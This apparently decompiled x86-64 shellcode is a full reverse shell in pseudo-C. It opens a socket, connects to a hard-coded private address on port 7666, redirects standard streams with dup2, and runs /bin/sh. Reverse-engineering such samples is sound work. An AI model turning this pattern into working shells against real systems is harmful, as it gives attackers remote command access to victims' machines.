void entry(void) {
	/* 78 */
	int ret1 = syscall_0x29(2, 1, 0); /* socket */
	/* 84 */
	syscall_0x2a(ret1, "\x02\x00\x1d\xf2\xc0\xa8\x64\x69", 0x10); /* connect */
	/* 9c */
	long long rsi = 3;
	/* 9f */
	do {
		syscall_0x21(ret1, rsi); /* dup2 */
	} while (not_equal());
	/* a9 */
	const char* rbx = "/bin/sh";
	const char* arr[] = {rbx, 0};
	syscall_0x3b(rbx, arr, 0); /* execve */
}
